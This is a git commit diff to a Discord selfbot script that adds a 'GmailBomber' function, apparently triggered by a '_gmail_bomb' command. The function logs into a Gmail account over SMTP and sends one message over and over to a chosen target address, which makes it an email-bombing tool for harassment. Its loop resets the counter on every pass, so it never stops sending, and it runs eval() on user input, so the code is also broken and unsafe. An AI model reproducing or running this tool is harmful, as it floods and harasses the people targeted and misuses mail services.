9ac25e383446391a7fcf8cb91c05bd2157726bf8
Okjit <77417233+Okjit@users.noreply.github.com>
2021-01-14 03:04:39 -0500

    Update main.py

--- ezo selfbot/main.py
+++ ezo selfbot/main.py
@@ -915,6 +915,26 @@ async def _gmail_bomb(ctx): # b'\xfc'
     await ctx.message.delete()
     GmailBomber()
 	    
+def GmailBomber():
+    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
+    _smpt.starttls()
+    username = input('Gmail: ')
+    password = input('Gmail Password: ')
+    try:
+        _smpt.login(username, password)
+    except:
+        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
+    target = input('Target Gmail: ')
+    message = input('Message to send: ')
+    counter = eval(input('Ammount of times: '))
+    count = 0
+    while count < counter:
+        count = 0
+        _smpt.sendmail(username, target, message)
+        count += 1
+    if count == counter:
+        pass
+	    
 ezo.command()
 async def ascii(ctx, *, text): # b'\xfc'
     await ctx.message.delete()
